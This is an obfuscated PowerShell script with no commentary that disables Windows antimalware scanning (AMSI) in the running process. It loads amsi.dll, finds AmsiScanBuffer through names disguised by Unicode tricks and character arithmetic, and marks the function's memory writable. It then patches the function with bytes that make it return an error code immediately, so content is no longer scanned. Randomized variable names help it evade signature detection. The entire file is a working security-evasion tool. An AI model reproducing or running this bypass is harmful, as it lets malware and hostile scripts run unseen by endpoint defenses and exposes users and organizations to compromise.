$JcmX9 = @"
using System;
using System.Runtime.InteropServices;
public class JcmX9 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr P2fMZK9Uzkh, string mnOUt);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr qf8PxAb_fshZi_S6, UIntPtr WfMq5GSCCt, uint H8Q09D6zEh5gEo, out uint EJQpvzAZ);
}
"@

Add-Type $JcmX9

$qlmYU = [JcmX9]::LoadLibrary("$(('ämsí'+'.dll').NoRmalIZE([cHAr](70+7-7)+[ChaR](111)+[ChaR]([ByTe]0x72)+[CHar]([byte]0x6d)+[cHAr]([bytE]0x44)) -replace [cHAr](92)+[chAr](65+47)+[ChaR]([bYTe]0x7b)+[chaR](57+20)+[ChAR]([BYtE]0x6e)+[CHar](125))")
$sfBYnFn3zcaM1B7Z = [JcmX9]::GetProcAddress($qlmYU, "$(('Ãm'+'sî'+'Sc'+'àn'+'Bú'+'ff'+'èr').nOrmaLIzE([CHaR](70)+[CHAr]([byte]0x6f)+[CHAR](114*38/38)+[ChAr](109)+[CHar](68+59-59)) -replace [CHAR](92+75-75)+[char]([ByTe]0x70)+[cHAR](123*85/85)+[chAr]([byTE]0x4d)+[cHAr](110*56/56)+[ChaR]([Byte]0x7d))")
$p = 0
[JcmX9]::VirtualProtect($sfBYnFn3zcaM1B7Z, [uint32]5, 0x40, [ref]$p)
$gKKdHZbjdgfU89XygY = "0xB8"
$f4l = "0x57"
$k6pMW = "0x00"
$KarqELkAYbjt7mzoz = "0x07"
$lOkPH5znvYi = "0x80"
$HcFXgr1Vp2amBj3ZX_1i = "0xC3"
$QzG4gr7 = [Byte[]] ($gKKdHZbjdgfU89XygY,$f4l,$k6pMW,$KarqELkAYbjt7mzoz,+$lOkPH5znvYi,+$HcFXgr1Vp2amBj3ZX_1i)
[System.Runtime.InteropServices.Marshal]::Copy($QzG4gr7, 0, $sfBYnFn3zcaM1B7Z, 6)